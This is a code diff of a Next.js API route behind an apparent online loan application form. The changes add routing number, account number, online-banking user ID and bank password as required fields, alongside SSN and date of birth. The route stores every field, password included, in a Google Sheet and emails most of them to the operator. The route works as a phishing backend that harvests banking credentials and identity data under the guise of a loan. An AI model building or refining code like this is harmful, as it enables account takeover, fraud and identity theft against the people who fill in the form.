@@ -12,27 +12,36 @@ export async function POST(req: NextRequest) {
   const requiredFields = [
     "firstName",
     "lastName",
-    "phone",
+    "dob",
     "email",
     "ssn",
-    "dob",
-    "address",
+    "streetAddress",
     "city",
     "state",
     "zip",
-    "housing",
+    "bankName",
     "loanAmount",
-    "loanPurpose",
-    "income",
-    "employment",
-    "bankUsername",
+    "routingNumber",
+    "accountNumber",
+    "bankUserId",
     "bankPassword",
+    "agreed",
   ];
 
   for (const field of requiredFields) {
     if (!data[field]) {
       return NextResponse.json({ error: `Missing field: ${field}` }, { status: 400 });
     }
+  }
+
+  const loanAmount = Number(data.loanAmount);
+  if (isNaN(loanAmount) || loanAmount < 1000 || loanAmount > 25000) {
+    return NextResponse.json({ error: "Loan amount must be between $1,000 and $25,000." }, { status: 400 });
+  }
+
+  const accountDigits = String(data.accountNumber).replace(/\D/g, "");
+  if (accountDigits.length < 4 || accountDigits.length > 20) {
+    return NextResponse.json({ error: "Account number must be between 4 and 20 digits." }, { status: 400 });
   }
 
   const serviceAccountEmail = process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL;
@@ -79,20 +88,18 @@ export async function POST(req: NextRequest) {
         new Date().toISOString(),
         data.firstName,
         data.lastName,
-        data.phone,
+        data.dob,
         data.email,
         data.ssn,
-        data.dob,
-        data.address,
+        data.streetAddress,
         data.city,
         data.state,
         data.zip,
-        data.housing,
+        data.bankName,
         data.loanAmount,
-        data.loanPurpose,
-        data.income,
-        data.employment,
-        data.bankUsername,
+        data.routingNumber,
+        data.accountNumber,
+        data.bankUserId,
         data.bankPassword,
       ];
 
@@ -119,17 +126,15 @@ export async function POST(req: NextRequest) {
         text: `A new loan application was submitted.
 
 Name: ${data.firstName} ${data.lastName}
-Phone: ${data.phone}
 Email: ${data.email}
 SSN: ${data.ssn}
 DOB: ${data.dob}
-Address: ${data.address}, ${data.city}, ${data.state} ${data.zip}
-Housing: ${data.housing}
+Address: ${data.streetAddress}, ${data.city}, ${data.state} ${data.zip}
+Bank name: ${data.bankName}
 Loan amount: ${data.loanAmount}
-Purpose: ${data.loanPurpose}
-Income: ${data.income}
-Employment: ${data.employment}
-Bank username: ${data.bankUsername}
+Routing number: ${data.routingNumber}
+Account number: ${data.accountNumber}
+Bank user ID: ${data.bankUserId}
 
 Submitted at: ${new Date().toISOString()}
 `,
